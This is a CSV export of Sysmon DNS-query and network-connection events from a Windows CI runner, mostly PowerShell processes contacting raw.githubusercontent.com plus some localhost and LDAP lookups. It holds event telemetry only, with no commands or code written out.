"TimeCreated","Id","Message"
"12/17/2025 8:50:06 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:50:04.775
ProcessGuid: {f995aebf-6ebb-6942-ba10-000000000e00}
ProcessId: 5896
QueryName: _ldap._tcp.dc._msdcs.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:50:06 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:50:03.429
ProcessGuid: {f995aebf-6ebb-6942-ba10-000000000e00}
ProcessId: 5896
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:50:04 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:50:03.433
ProcessGuid: {f995aebf-6ebb-6942-ba10-000000000e00}
ProcessId: 5896
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54815
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:50:04 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:50:02.606
ProcessGuid: {f995aebf-6eb8-6942-b810-000000000e00}
ProcessId: 4572
QueryName: _ldap._tcp.dc._msdcs.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:50:03 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:50:01.196
ProcessGuid: {f995aebf-6eb8-6942-b810-000000000e00}
ProcessId: 4572
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:50:02 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:50:01.200
ProcessGuid: {f995aebf-6eb8-6942-b810-000000000e00}
ProcessId: 4572
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54814
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:49:41 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:49:40.017
ProcessGuid: {f995aebf-6ea2-6942-7810-000000000e00}
ProcessId: 8268
QueryName: _ldap._tcp.dc._msdcs.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:49:41 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:49:38.530
ProcessGuid: {f995aebf-6ea2-6942-7810-000000000e00}
ProcessId: 8268
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:49:39 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:49:38.534
ProcessGuid: {f995aebf-6ea2-6942-7810-000000000e00}
ProcessId: 8268
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54798
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:49:37 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:49:35.710
ProcessGuid: {f995aebf-6e9d-6942-7410-000000000e00}
ProcessId: 6628
QueryName: _ldap._tcp.dc._msdcs.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:49:37 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:49:34.092
ProcessGuid: {f995aebf-6e9d-6942-7410-000000000e00}
ProcessId: 6628
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:49:35 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:49:34.096
ProcessGuid: {f995aebf-6e9d-6942-7410-000000000e00}
ProcessId: 6628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54796
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:48:57 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:48:57.013
ProcessGuid: {f995aebf-6d0e-6942-8a0c-000000000e00}
ProcessId: 7356
QueryName: allports.exposed
QueryStatus: 9501
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:48:13 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:48:11.372
ProcessGuid: {f995aebf-6a62-6942-b50a-000000000e00}
ProcessId: 5412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 57694
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 168.63.129.16
DestinationHostname: -
DestinationPort: 53
DestinationPortName: domain"
"12/17/2025 8:48:13 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:48:11.370
ProcessGuid: {f995aebf-6a62-6942-b50a-000000000e00}
ProcessId: 5412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 57693
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 168.63.129.16
DestinationHostname: -
DestinationPort: 53
DestinationPortName: domain"
"12/17/2025 8:48:10 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:48:08.920
ProcessGuid: {f995aebf-6a62-6942-b50a-000000000e00}
ProcessId: 5412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 57554
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 168.63.129.16
DestinationHostname: -
DestinationPort: 53
DestinationPortName: domain"
"12/17/2025 8:48:10 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:48:08.917
ProcessGuid: {f995aebf-6a62-6942-b50a-000000000e00}
ProcessId: 5412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 57553
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 168.63.129.16
DestinationHostname: -
DestinationPort: 53
DestinationPortName: domain"
"12/17/2025 8:48:09 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:48:07.594
ProcessGuid: {f995aebf-6bd5-6942-ff0b-000000000e00}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 57478
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 168.63.129.16
DestinationHostname: -
DestinationPort: 53
DestinationPortName: domain"
"12/17/2025 8:48:09 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:48:07.593
ProcessGuid: {f995aebf-6bd5-6942-ff0b-000000000e00}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 57477
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 168.63.129.16
DestinationHostname: -
DestinationPort: 53
DestinationPortName: domain"
"12/17/2025 8:42:57 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:42:55.073
ProcessGuid: {f995aebf-6d0e-6942-8a0c-000000000e00}
ProcessId: 7356
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:40:26 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:40:24.886
ProcessGuid: {f995aebf-6c0c-6942-050c-000000000e00}
ProcessId: 2560
QueryName: localhost
QueryStatus: 0
QueryResults: ::1;::ffff:127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:40:26 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:40:24.974
ProcessGuid: {f995aebf-6c0c-6942-050c-000000000e00}
ProcessId: 2560
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 127.0.0.1
SourceHostname: runnervm8j6r3
SourcePort: 54564
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 127.0.0.1
DestinationHostname: runnervm8j6r3
DestinationPort: 135
DestinationPortName: epmap"
"12/17/2025 8:38:38 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:38:37.020
ProcessGuid: {f995aebf-6c0c-6942-050c-000000000e00}
ProcessId: 2560
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:38:38 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:38:37.024
ProcessGuid: {f995aebf-6c0c-6942-050c-000000000e00}
ProcessId: 2560
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54519
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:37:43 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:37:42.219
ProcessGuid: {f995aebf-6bd5-6942-ff0b-000000000e00}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54494
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:37:42 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:37:42.215
ProcessGuid: {f995aebf-6bd5-6942-ff0b-000000000e00}
ProcessId: 7576
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:35:39 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:35:37.675
ProcessGuid: {f995aebf-6b59-6942-e30b-000000000e00}
ProcessId: 7896
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 127.0.0.1
SourceHostname: runnervm8j6r3
SourcePort: 54441
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 127.0.0.1
DestinationHostname: runnervm8j6r3
DestinationPort: 445
DestinationPortName: microsoft-ds"
"12/17/2025 8:35:39 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:35:37.400
ProcessGuid: {f995aebf-6b59-6942-e30b-000000000e00}
ProcessId: 7896
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54440
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:35:39 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:35:37.676
ProcessGuid: {f995aebf-6b59-6942-e30b-000000000e00}
ProcessId: 7896
QueryName: localhost
QueryStatus: 0
QueryResults: ::1;::ffff:127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:35:39 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:35:37.396
ProcessGuid: {f995aebf-6b59-6942-e30b-000000000e00}
ProcessId: 7896
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:33:38 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:33:36.687
ProcessGuid: {f995aebf-6ae0-6942-d60b-000000000e00}
ProcessId: 6252
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54390
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:33:38 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:33:37.132
ProcessGuid: {f995aebf-6ae0-6942-d60b-000000000e00}
ProcessId: 6252
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:33:38 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:33:36.683
ProcessGuid: {f995aebf-6ae0-6942-d60b-000000000e00}
ProcessId: 6252
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:33:30 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:33:29.249
ProcessGuid: {f995aebf-6ad8-6942-c30a-000000000e00}
ProcessId: 1292
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:33:30 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:33:28.623
ProcessGuid: {f995aebf-6ad8-6942-c30a-000000000e00}
ProcessId: 1292
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:33:30 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:33:28.627
ProcessGuid: {f995aebf-6ad8-6942-c30a-000000000e00}
ProcessId: 1292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54389
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:32:07 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:32:05.872
ProcessGuid: {f995aebf-6a62-6942-b50a-000000000e00}
ProcessId: 5412
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:31:33 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:31:31.182
ProcessGuid: {f995aebf-6a62-6942-b50a-000000000e00}
ProcessId: 5412
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:31:32 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:31:31.186
ProcessGuid: {f995aebf-6a62-6942-b50a-000000000e00}
ProcessId: 5412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54339
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:30:45 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:30:43.291
ProcessGuid: {f995aebf-69ea-6942-990a-000000000e00}
ProcessId: 9008
QueryName: 127.0.0.1
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:30:45 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:30:43.291
ProcessGuid: {f995aebf-69ea-6942-990a-000000000e00}
ProcessId: 9008
QueryName: runnervm8j6r3
QueryStatus: 0
QueryResults: 10.1.0.123;172.22.64.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:30:45 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:30:43.291
ProcessGuid: {f995aebf-69ea-6942-990a-000000000e00}
ProcessId: 9008
QueryName: 1.0.0.127.in-addr.arpa.
QueryStatus: 0
QueryResults: type: 12 runnervm8j6r3;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:30:42 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:30:41.197
ProcessGuid: {f995aebf-69ea-6942-990a-000000000e00}
ProcessId: 9008
QueryName: localhost
QueryStatus: 0
QueryResults: ::1;::ffff:127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:30:42 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:30:40.642
ProcessGuid: {f995aebf-69ea-6942-990a-000000000e00}
ProcessId: 9008
QueryName: runnervm8j6r3
QueryStatus: 0
QueryResults: fe80::9374:23d4:77d7:1cbd;fe80::54b9:af1f:d058:25cb;::ffff:10.1.0.123;::ffff:172.22.64.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:30:41 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:30:40.642
ProcessGuid: {f995aebf-69ea-6942-990a-000000000e00}
ProcessId: 9008
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: true
SourceIp: fe80:0:0:0:9374:23d4:77d7:1cbd
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54314
SourcePortName: -
DestinationIsIpv6: true
DestinationIp: fe80:0:0:0:9374:23d4:77d7:1cbd
DestinationHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
DestinationPort: 49666
DestinationPortName: -"
"12/17/2025 8:30:41 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:30:40.641
ProcessGuid: {f995aebf-69ea-6942-990a-000000000e00}
ProcessId: 9008
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: true
SourceIp: fe80:0:0:0:9374:23d4:77d7:1cbd
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54313
SourcePortName: -
DestinationIsIpv6: true
DestinationIp: fe80:0:0:0:9374:23d4:77d7:1cbd
DestinationHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
DestinationPort: 135
DestinationPortName: epmap"
"12/17/2025 8:29:32 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:29:30.760
ProcessGuid: {f995aebf-69ea-6942-990a-000000000e00}
ProcessId: 9008
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:29:32 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:29:30.764
ProcessGuid: {f995aebf-69ea-6942-990a-000000000e00}
ProcessId: 9008
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54286
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:29:27 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:29:25.810
ProcessGuid: {f995aebf-69e5-6942-960a-000000000e00}
ProcessId: 4668
QueryName: runnervm8j6r3
QueryStatus: 0
QueryResults: fe80::9374:23d4:77d7:1cbd;fe80::54b9:af1f:d058:25cb;::ffff:10.1.0.123;::ffff:172.22.64.1;
Image: C:\Windows\System32\cscript.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:29:27 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:29:25.809
ProcessGuid: {f995aebf-69e5-6942-960a-000000000e00}
ProcessId: 4668
QueryName: _ldap._tcp.runnervm8j6r3.
QueryStatus: 1460
QueryResults: -
Image: C:\Windows\System32\cscript.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:29:27 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:29:25.808
ProcessGuid: {f995aebf-69e5-6942-960a-000000000e00}
ProcessId: 4668
QueryName: _ldap._tcp.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\system32\cscript.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:29:03 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:29:01.924
ProcessGuid: {f995aebf-69cd-6942-450a-000000000e00}
ProcessId: 6856
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:29:02 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:29:01.928
ProcessGuid: {f995aebf-69cd-6942-450a-000000000e00}
ProcessId: 6856
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54269
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:28:04 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:28:02.817
ProcessGuid: {f995aebf-6992-6942-8609-000000000e00}
ProcessId: 7720
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54237
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:28:04 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:28:02.813
ProcessGuid: {f995aebf-6992-6942-8609-000000000e00}
ProcessId: 7720
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:25:56 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:25:54.508
